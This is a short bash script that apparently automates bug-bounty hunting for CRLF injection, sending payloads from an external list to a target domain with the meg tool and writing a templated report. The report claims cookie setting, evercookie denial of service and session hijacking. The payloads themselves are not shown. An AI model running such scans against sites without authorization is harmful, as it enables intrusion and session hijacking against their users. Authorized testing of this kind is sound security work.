#!/bin/bash

# This script finds CRLF vulnerabilities and generates a report.

GREEN='\033[0;32m'
END='\033[0m'

#printf "${GREEN}[+]${END} Finding subdomains.\\n"
#python Sublist3r/sublist3r.py -d $1 -o domains-sub > /dev/null
#while read domain; do
#	if host "$domain" > /dev/null; then
#		echo $domain;
#	fi;
#done < domains-sub >> output

echo $1 | sed -r 's#https?://##I' | sed -r 's#/.*##' | sed -r 's#^\*\.?##' | sed -r 's#,#\n#g' | tr '[:upper:]' '[:lower:]' | uniq | sed -e 's/^/https:\/\//' > domains-plus
targets="domains-plus"

printf "${GREEN}[+]${END} Finding CRLF injection.\\n"
./meg --delay 100 lists/crlfinjection $targets &>/dev/null
while read domain; do
   request=$(grep -HrliE "< Set-Cookie: ?crlf" out/$domain | head -n1 | xargs head -n1 | head -n1)
   base=$(echo "$domain" | awk -F/ '{print $2}')
   echo -e """${GREEN}
# CRLF injection in $domain

$domain is vulnerable to CRLF injection — an attacker can set cookies on behalf of the victim. On top of that, since this is a subdomain of $base, I can set cookies for $base too.

~~
$ curl $request | grep "crlf"
~~

# PoC

Browse to this URL and check the response header: $request

# Impact

One can set cookies. I could create an evercookie bomb, which would escalate this issue to persistent client-side DoS. I can also set session cookies on behalf of a user and hijack their session.
   ${END}""" > report
   echo
done < <(grep -HrliE "< Set-Cookie: ?crlf" out/ | cut -d/ -f2 | sort -u)
